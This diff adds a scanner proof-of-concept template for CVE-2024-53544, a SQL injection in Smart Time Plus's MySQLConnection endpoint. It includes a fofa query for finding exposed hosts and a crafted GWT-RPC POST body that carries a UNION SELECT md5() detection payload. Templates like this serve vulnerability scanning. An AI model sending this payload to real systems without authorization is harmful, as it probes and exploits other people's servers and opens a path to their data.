@@ -1,0 +1,23 @@
+id: poc-yaml-smarttimeplus-mysqlconnection-sqli
+info:
+  name: Smart Time Plus /smarttimeplus/MySQLConnection SQL注入漏洞（CVE-2024-53544）
+  severity: critical
+  tags:
+  - sql-injection
+  - CVE-2024-53544
+  finger: smarttimeplus
+  fofa: title="smart time plus"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /smarttimeplus/MySQLConnection
+  headers:
+    Content-Type: text/x-gwt-rpc; charset=utf-8
+    X-Gwt-Permutation: null
+  data: 7|0|6|{{.base_url}}/smarttimeplus/|99F97D9159E5E5154B6415791EF65C43|com.novachron.smarttimeplus.client.DBConn|getCookieNames|java.lang.String/2004016611|999)
+    UNION select md5({{.t1}})-- |1|2|3|4|1|5|6|
+  expression: "status_code == 200 && \ncontains(body,\"OK\") &&\ncontains(headers,\"\
+    application/json\") &&\ncontains(body,t2)\n"
+transport: http
